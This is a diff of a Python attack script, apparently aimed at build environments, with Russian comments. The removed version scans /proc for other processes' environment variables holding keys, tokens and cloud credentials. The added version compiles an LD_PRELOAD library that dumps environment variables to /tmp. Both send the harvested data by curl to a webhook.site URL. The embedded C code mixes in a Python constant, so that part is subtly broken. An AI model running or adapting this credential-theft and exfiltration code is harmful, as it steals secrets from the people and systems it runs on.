@@ -1,57 +1,52 @@
 import os
-import json
 import subprocess
 
-WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
+def inject_ld_preload():
+    cpp_code = r"""
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
 
-def exploit_cross_pid_leak():
-    leaked_data = []
-    my_pid = os.getpid()
-
-    # Перебираем все PID в системе
-    for pid_dir in os.listdir('/proc'):
-        if not pid_dir.isdigit():
-            continue
-        
-        pid = int(pid_dir)
-        if pid == my_pid: # Пропускаем себя
-            continue
-
-        try:
-            # 1. Читаем cmdline, чтобы понять, что за процесс
-            with open(f'/proc/{pid}/cmdline', 'rb') as f:
-                cmd = f.read().replace(b'\0', b' ').decode(errors='ignore')
-            
-            # 2. Пытаемся прочитать переменные окружения (самое ценное)
-            with open(f'/proc/{pid}/environ', 'rb') as f:
-                env_raw = f.read().decode(errors='ignore')
-                # Ищем только те процессы, где есть намеки на секреты
-                if any(k in env_raw.upper() for k in ['KEY', 'SECRET', 'TOKEN', 'AWS', 'GCP', 'KUBE']):
-                    # Очищаем вывод от нулевых байтов для JSON
-                    env_clean = env_raw.replace('\0', '\n')
-                    leaked_data.append({
-                        "pid": pid,
-                        "cmd": cmd,
-                        "env": env_clean[:1000] # Берем первый килобайт данных
-                    })
-        except (PermissionError, FileNotFoundError):
-            # Если доступа нет — это нормально для защищенной системы.
-            # Если доступ ЕСТЬ — это критическая уязвимость.
-            continue
-
-    # Формируем финальный отчет
-    report = {
-        "VULNERABILITY": "CROSS_PROCESS_ENV_EXPOSURE",
-        "status": "SUCCESS" if leaked_data else "FAILED_TO_READ_OTHERS",
-        "found_leaks_count": len(leaked_data),
-        "data": leaked_data
+__attribute__((constructor))
+void init() {
+    // Пишем в файл, который точно доступен
+    int fd = open("/tmp/leak.log", O_WRONLY | os.O_CREAT | os.O_APPEND, 0666);
+    extern char **environ;
+    for (char **env = environ; *env != NULL; env++) {
+        write(fd, *env, strlen(*env));
+        write(fd, "\n", 1);
     }
+    close(fd);
+}
+"""
+    with open("/tmp/spy.cpp", "w") as f:
+        f.write(cpp_code)
 
-    # Отправляем на хук
-    subprocess.Popen([
-        'curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json',
-        '-d', json.dumps(report), WEBHOOK_URL
-    ])
+    # Компилируем в shared object
+    # В билд-средах обычно есть gcc или clang
+    try:
+        subprocess.run(["g++", "-fPIC", "-shared", "-o", "/tmp/spy.so", "/tmp/spy.cpp"], check=True)
+        
+        # Активируем через переменную окружения для текущего процесса и всех дочерних
+        os.environ["LD_PRELOAD"] = "/tmp/spy.so"
+        
+        # Теперь запускаем любую безобидную команду, например 'id' или 'ls'
+        # Наша библиотека перехватит этот запуск
+        subprocess.run(["ls", "/etc/resolv.conf"])
+        
+        # Читаем, что удалось собрать
+        if os.path.exists("/tmp/leak.log"):
+            with open("/tmp/leak.log", "r") as f:
+                data = f.read()
+                print("[+] Intercepted Data via LD_PRELOAD:\n", data[:500])
+                
+                # Отправляем на твой хук
+                subprocess.run(['curl', '-s', '-X', 'POST', '-d', data, 'https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2'])
+                
+    except Exception as e:
+        print(f"[-] Injection failed: {e}")
 
 if __name__ == "__main__":
-    exploit_cross_pid_leak()
+    inject_ld_preload()
